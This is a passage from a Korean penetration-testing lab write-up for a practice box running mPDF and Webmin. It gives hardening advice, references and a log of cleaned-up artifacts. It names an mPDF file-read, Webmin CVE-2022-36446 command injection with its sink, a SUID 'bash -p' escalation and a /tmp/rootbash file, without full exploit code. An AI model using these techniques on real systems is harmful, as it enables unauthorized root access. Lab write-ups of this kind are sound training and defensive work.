- `config.php`, `/vendor` 를 문서 루트에서 노출하지 마라. `Options -Indexes`, 민감 파일은 웹루트 밖으로. 주석 처리했다고 사라지는 게 아니다.
- 자격증명을 소스에 평문으로 두지 말고, 하나의 비번을 SSH·Webmin·DB 에 재사용하지 마라.
- Webmin 을 1.997+ 로 패치(CVE-2022-36446). package-updates 같은 고위험 모듈은 일반 계정 ACL 에서 빼고, 10000 은 `0.0.0.0` 이 아니라 관리망 인터페이스에만 바인딩한다. 방화벽 하나에만 기대면 내부 접근이 곧 관리자 접근이 된다.

## 9. 참고 자료

- CVE-2022-36446 — Webmin < 1.997 Software Package Updates authenticated RCE. 싱크는 `software/apt-lib.pl` 의 `update_system_install`
- Webmin 1.996 원본 소스 — `github.com/webmin/webmin` tag `1.996` (이 노트의 perl 인용 검증에 사용)
- mPDF `<annotation file="">` arbitrary file read (mPDF 6.x 계열)
- GTFOBins: `bash` (SUID) — `bash -p`

## 남긴 흔적

확인함(직접 검증):
- `/tmp/rootbash`, `/tmp/whoami_root` — 삭제 후 `ls` 로 부재 확인.
- Kali tmux 세션 `out_nmap`·`out_gobust`·`out_nc`·`out_fwd` — 세션 이름으로만 종료, `tmux ls` 로 소멸 확인. `ss -lntp` 에 내 443/10000 리스너 없음.
- 계정 생성·원본 파일 수정 없음. Webmin 주입이 `apt-get install` 을 태웠으나 응답 원문이 `0 upgraded, 0 newly installed, 0 to remove and 78 not upgraded.` — 존재하지 않는 "패키지"라 실제 설치 변화 없음.

미확인:
- Webmin 이 apt 실행 중 만든 캐시/락 파일(`/var/cache/apt` 등) 잔재 여부 — root 권한 회수 후라 재확인 못 함. 기능적 영향 없음으로 판단.
- svc-account 로그인이 남긴 Webmin 세션 로그(`/var/webmin/miniserv.log`) — root 소유라 정리 불가, 보존.

## 스크린샷

`파일보관/PG-Outdated-mpdf_80.png` 1장(웹 80 변환 폼)만 있다. 나머지는 헤드리스 작업이라 화면이 없고, **박스가 정지돼 추가 촬영 불가**. 플래그 증거는 `whoami; id; hostname; hostname -I; date; cat <flag>` 를 한 화면에 담은 텍스트로 `proof_user.txt`·`proof_root.txt` 에 남겼다 — 시험에서는 이 조합을 스크린샷으로 찍어야 인정된다.

## 관련 노트

- "응답이 성공을 뜻하지 않는다"(302 + 경고 본문 = 거부 신호) 패턴 — [[Crane]] · [[Squid]] · [[RubyDome]]
- 버전 판정 독립 근거 2개(응답 헤더 + PDF `/Producer`) — [[Hub]] · [[Levram]]
- "인용이 깨지면 인코딩으로 도망간다"(여기선 `/` 잘림 → base64) — [[Hawat]] · [[Exfiltrated]] · [[Squid]]
- 전수 진행현황 — [[_STATUS]]
